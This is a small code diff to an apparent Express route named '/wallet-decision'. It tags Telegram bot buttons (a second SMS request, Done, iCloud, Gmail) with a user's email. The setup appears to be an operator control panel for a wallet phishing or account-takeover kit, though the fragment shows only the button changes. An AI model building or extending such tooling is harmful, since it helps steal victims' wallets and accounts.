@@ -1923,11 +1923,11 @@ app.post("/wallet-decision", async (req, res) => {
         parse_mode: "HTML",
         reply_markup: {
           inline_keyboard: [
-            [{ text: "💬 SMS - 2 💬", callback_data: "wallet_decision_sms" }],
-            [{ text: "🏁 Done 🏁", callback_data: "wallet_decision_done" }],
+            [{ text: "💬 SMS - 2 💬", callback_data: `wallet_decision_sms|${email}` }],
+            [{ text: "🏁 Done 🏁", callback_data: `wallet_decision_done|${email}` }],
             [
-              { text: "☁️", callback_data: "wallet_decision_icloud" },
-              { text: "🌈", callback_data: "wallet_decision_gmail" }
+              { text: "☁️", callback_data: `wallet_decision_icloud|${email}` },
+              { text: "🌈", callback_data: `wallet_decision_gmail|${email}` }
             ]
           ]
         }
